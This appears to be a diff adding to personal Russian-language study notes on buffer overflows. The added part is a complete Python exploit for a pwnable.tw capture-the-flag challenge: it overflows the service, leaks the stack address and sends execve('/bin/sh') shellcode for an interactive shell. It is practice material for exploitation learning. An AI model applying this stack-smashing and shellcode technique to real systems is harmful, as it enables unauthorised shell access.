@@ -1,4 +1,4 @@
-
+ 
 # [[Buffer owerflow|Buffer Overflow]] 
 
 **Подготовка**
@@ -1080,6 +1080,85 @@ _start:
 	xor al,al
 	inc al
 	int 0x80
+```
+
+Без посторонних библиотек:
+
+```python
+import socket
+import struct
+import threading
+import sys
+
+# Параметры подключения
+host = 'chall.pwnable.tw'
+port = 10000
+
+# Создаем сокет и подключаемся к серверу
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+
+# Получаем данные до символа ':'
+data = s.recv(1024)
+print(data.decode(errors='ignore'))
+
+# Первый payload
+padding = b'i' * 20
+payload = padding + struct.pack('<I', 0x08048087)
+s.send(payload)
+
+# Получаем ответ и распаковываем адрес
+tmp = s.recv(4)
+esp = struct.unpack('<I', tmp[:4])[0]
+print(f"[+] Found esp: {hex(esp)}")
+
+# Shellcode
+shellcode = (
+    b"\x68\x2f\x73\x68\x00"  # push   0x68732f
+    b"\x68\x2f\x62\x69\x6e"  # push   0x6e69622f
+    b"\x31\xd2"              # xor    edx, edx
+    b"\x31\xc9"              # xor    ecx, ecx
+    b"\x31\xd2"              # xor    edx, edx
+    b"\x89\xe3"              # mov    ebx, esp
+    b"\xb0\x0b"              # mov    al, 0xb
+    b"\xcd\x80"              # int    0x80
+    b"\x30\xc0"              # xor    al, al
+    b"\xfe\xc0"              # inc    al
+    b"\xcd\x80"              # int    0x80
+)
+
+# Второй payload
+payload2 = b'i' * 20 + struct.pack('<I', esp + 20) + shellcode
+s.send(payload2)
+
+# Функция для чтения пользовательского ввода и отправки его на сервер
+def send_input(sock):
+    while True:
+        try:
+            user_input = sys.stdin.read(1)
+            sock.send(user_input.encode())
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+
+# Создаем и запускаем поток для отправки пользовательского ввода
+input_thread = threading.Thread(target=send_input, args=(s,))
+input_thread.daemon = True
+input_thread.start()
+
+# Основной поток для получения данных из сокета и вывода их на экран
+try:
+    while True:
+        data = s.recv(4096)
+        if not data:
+            print("Connection closed by remote host")
+            break
+        print(data.decode(errors='ignore'), end="")
+except KeyboardInterrupt:
+    print("\nExiting...")
+finally:
+    s.close()
+
 ```
 
 ---
